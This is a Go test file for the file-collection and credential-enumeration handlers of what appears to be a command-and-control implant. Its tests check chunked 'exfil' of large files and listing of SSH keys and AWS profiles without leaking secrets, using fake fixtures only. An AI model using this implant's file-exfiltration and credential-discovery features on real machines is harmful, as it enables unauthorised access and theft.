package exec

// collect_test.go covers the collect.* dispatch surface: argument parsing,
// collect.file read/missing/directory refusal, the large-file chunking path,
// and collect.cred source filtering plus the no-secret-material invariant.
// The AWS/SSH enumeration is exercised against a synthetic HOME so the test
// never touches the developer's own ~/.ssh or ~/.aws; cmdkey is Windows-only
// and its refusal is documented by the platform branch.

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/cw/rod/implant/rodpb"
)

func TestCollectFile_MissingFile_FailsWithCause(t *testing.T) {
	r := NewRunner(nil)
	outcome, output, chunks := r.Dispatch(
		context.Background(), "collect.file", filepath.Join(t.TempDir(), "absent"))
	if outcome != rodpb.TaskOutcome_TASK_OUTCOME_FAILED {
		t.Fatalf("outcome = %v, want FAILED", outcome)
	}
	if !strings.Contains(output, "stat ") {
		t.Fatalf("output = %q, want a stat error", output)
	}
	if chunks != nil {
		t.Fatalf("chunks = %v, want nil for a failed read", chunks)
	}
}

func TestCollectFile_EmptyPath_FailsWithCause(t *testing.T) {
	r := NewRunner(nil)
	outcome, output, _ := r.Dispatch(context.Background(), "collect.file", "")
	if outcome != rodpb.TaskOutcome_TASK_OUTCOME_FAILED {
		t.Fatalf("outcome = %v, want FAILED", outcome)
	}
	if !strings.Contains(output, "collect.file expects") {
		t.Fatalf("output = %q, want a usage message", output)
	}
}

func TestCollectFile_Directory_RefusesWithCause(t *testing.T) {
	r := NewRunner(nil)
	dir := t.TempDir()
	outcome, output, _ := r.Dispatch(context.Background(), "collect.file", dir)
	if outcome != rodpb.TaskOutcome_TASK_OUTCOME_FAILED {
		t.Fatalf("outcome = %v, want FAILED", outcome)
	}
	if !strings.Contains(output, "directory") {
		t.Fatalf("output = %q, want a directory refusal", output)
	}
}

func TestCollectFile_SucceedsWithContents(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "note.txt")
	const want = "hello collect.file"
	if err := os.WriteFile(path, []byte(want), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	r := NewRunner(nil)
	outcome, output, chunks := r.Dispatch(context.Background(), "collect.file", path)
	if outcome != rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED {
		t.Fatalf("outcome = %v, want SUCCEEDED", outcome)
	}
	if output != want {
		t.Fatalf("output = %q, want %q", output, want)
	}
	if chunks != nil {
		t.Fatalf("chunks = %v, want nil for an inline read", chunks)
	}
}

// TestCollectFile_LargeFile_ProducesChunks verifies a file larger than the
// inline limit is returned as ExfilChunk frames rather than inlined in the
// TaskResult output. The output should be a manifest, and the chunk bytes
// should reassemble to the original file.
func TestCollectFile_LargeFile_ProducesChunks(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "big.bin")
	// A bit over twice the chunk size so we exercise a multi-chunk path.
	size := collectChunkSize*2 + 4096
	payload := make([]byte, size)
	for i := range payload {
		payload[i] = byte(i % 251)
	}
	if err := os.WriteFile(path, payload, 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}

	r := NewRunner(nil)
	outcome, output, chunks := r.Dispatch(context.Background(), "collect.file", path)
	if outcome != rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED {
		t.Fatalf("outcome = %v, want SUCCEEDED, output=%q", outcome, output)
	}
	if len(chunks) == 0 {
		t.Fatalf("chunks empty for a %d-byte file", size)
	}
	if !strings.Contains(output, "chunks streamed") {
		t.Fatalf("output = %q, want a manifest mentioning chunks streamed", output)
	}

	// Reassemble and verify the bytes match the file.
	var got []byte
	for i, c := range chunks {
		if int(c.Sequence) != i+1 {
			t.Fatalf("chunk %d sequence = %d, want %d", i, c.Sequence, i+1)
		}
		got = append(got, c.Data...)
	}
	if c := chunks[len(chunks)-1]; !c.Terminal {
		t.Fatalf("last chunk Terminal = false, want true")
	}
	if string(got) != string(payload) {
		t.Fatalf("reassembled %d bytes, want %d", len(got), len(payload))
	}
}

func TestCollectCred_UnknownSource_FailsWithCause(t *testing.T) {
	r := NewRunner(nil)
	outcome, output, _ := r.Dispatch(context.Background(), "collect.cred", "kerberos")
	if outcome != rodpb.TaskOutcome_TASK_OUTCOME_FAILED {
		t.Fatalf("outcome = %v, want FAILED", outcome)
	}
	if !strings.Contains(output, "unknown source") {
		t.Fatalf("output = %q, want 'unknown source'", output)
	}
}

// TestCollectCred_ListsSSHProfiles_NoSecretMaterial drives collect.cred against
// a synthetic HOME containing a .ssh directory with a public key and a private
// key (no .pub sibling). It asserts the handler lists both and never dumps a
// private key body or a PRIVATE KEY marker.
func TestCollectCred_ListsSSHProfiles_NoSecretMaterial(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("synthetic ~/.ssh fixture relies on POSIX HOME; Windows exercised by build")
	}
	home := t.TempDir()
	t.Setenv("HOME", home)
	if err := os.MkdirAll(filepath.Join(home, ".ssh"), 0o700); err != nil {
		t.Fatalf("mkdir .ssh: %v", err)
	}
	// A real OpenSSH public key so ssh-keygen -lf (when available) can fingerprint it.
	// If ssh-keygen is absent on the test host, the handler reports the .pub line is
	// skipped -- acceptable; the private-key line still proves the no-secret invariant.
	pub := []byte("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdTestKeyRodCollectCredSSH collect-test\n")
	if err := os.WriteFile(filepath.Join(home, ".ssh", "id_ed25519.pub"), pub, 0o644); err != nil {
		t.Fatalf("write pub: %v", err)
	}
	// A bare private key (no .pub sibling) so the "private key, no .pub" line appears.
	privBody := []byte("-----BEGIN OPENSSH PRIVATE KEY-----\nFAKEKEYBODY_DO_NOT_LEAK\n-----END OPENSSH PRIVATE KEY-----\n")
	if err := os.WriteFile(filepath.Join(home, ".ssh", "id_bare"), privBody, 0o600); err != nil {
		t.Fatalf("write priv: %v", err)
	}

	r := NewRunner(nil)
	outcome, output, _ := r.Dispatch(context.Background(), "collect.cred", "ssh")
	if outcome != rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED {
		t.Fatalf("outcome = %v, want SUCCEEDED, output=%q", outcome, output)
	}
	// The bare private key is reported by name with a "no .pub sibling" note.
	if !strings.Contains(output, "id_bare") {
		t.Fatalf("output = %q, want id_bare listed", output)
	}
	if !strings.Contains(output, "no .pub sibling") {
		t.Fatalf("output = %q, want 'no .pub sibling' marker", output)
	}
	// The invariant: the private key body must never appear in the output.
	if strings.Contains(output, "FAKEKEYBODY_DO_NOT_LEAK") {
		t.Fatalf("output leaked private key body: %q", output)
	}
	if strings.Contains(output, "BEGIN OPENSSH PRIVATE KEY") {
		t.Fatalf("output leaked PEM marker: %q", output)
	}
}

// TestCollectCred_ListsAWSProfiles_NoSecretMaterial drives collect.cred
// against a synthetic HOME with an AWS credentials file. The handler must list
// both profiles by name and never dump the secret value.
func TestCollectCred_ListsAWSProfiles_NoSecretMaterial(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("synthetic ~/.aws fixture relies on POSIX HOME; Windows exercised by build")
	}
	home := t.TempDir()
	t.Setenv("HOME", home)
	if err := os.MkdirAll(filepath.Join(home, ".aws"), 0o700); err != nil {
		t.Fatalf("mkdir .aws: %v", err)
	}
	creds := []byte(strings.Join([]string{
		"[default]",
		"aws_access_key_id = AKIAFAKEKEYID1234",
		"aws_secret_access_key = sUpErSeCrEtDoNoTlEaK1234567890",
		"",
		"[work]",
		"aws_access_key_id = AKIAOTHERKEYID5678",
		"aws_secret_access_key = aNoThErSeCrEtVaLuE0987654321",
		"",
	}, "\n"))
	if err := os.WriteFile(filepath.Join(home, ".aws", "credentials"), creds, 0o600); err != nil {
		t.Fatalf("write creds: %v", err)
	}

	r := NewRunner(nil)
	outcome, output, _ := r.Dispatch(context.Background(), "collect.cred", "aws")
	if outcome != rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED {
		t.Fatalf("outcome = %v, want SUCCEEDED, output=%q", outcome, output)
	}
	if !strings.Contains(output, "aws default") {
		t.Fatalf("output = %q, want 'aws default' profile listed", output)
	}
	if !strings.Contains(output, "aws work") {
		t.Fatalf("output = %q, want 'aws work' profile listed", output)
	}
	// The invariant: no secret access key value is ever surfaced.
	if strings.Contains(output, "sUpErSeCrEtDoNoTlEaK") {
		t.Fatalf("output leaked AWS secret: %q", output)
	}
	if strings.Contains(output, "aNoThErSeCrEtVaLuE") {
		t.Fatalf("output leaked AWS secret: %q", output)
	}
	// The "secret in file" marker should appear, since both profiles declare one.
	if !strings.Contains(output, "secret in file") {
		t.Fatalf("output = %q, want 'secret in file' marker", output)
	}
}

func TestChunkFile_SingleEmptyFile(t *testing.T) {
	chunks := chunkFile("empty.txt", "text/plain", nil)
	if len(chunks) != 1 {
		t.Fatalf("len(chunks) = %d, want 1", len(chunks))
	}
	if !chunks[0].Terminal {
		t.Fatalf("terminal = false, want true")
	}
	if chunks[0].Sequence != 1 {
		t.Fatalf("sequence = %d, want 1", chunks[0].Sequence)
	}
}

func TestChunkFile_MultiChunkTerminalFlag(t *testing.T) {
	// 1.5 chunks worth of data: expect 2 chunks, only the last terminal.
	data := make([]byte, collectChunkSize+1024)
	chunks := chunkFile("blob.bin", "application/octet-stream", data)
	if len(chunks) != 2 {
		t.Fatalf("len(chunks) = %d, want 2", len(chunks))
	}
	if chunks[0].Terminal {
		t.Fatalf("chunk 0 terminal = true, want false")
	}
	if !chunks[1].Terminal {
		t.Fatalf("chunk 1 terminal = false, want true")
	}
	if chunks[0].Sequence != 1 || chunks[1].Sequence != 2 {
		t.Fatalf("sequences = %d,%d, want 1,2", chunks[0].Sequence, chunks[1].Sequence)
	}
}
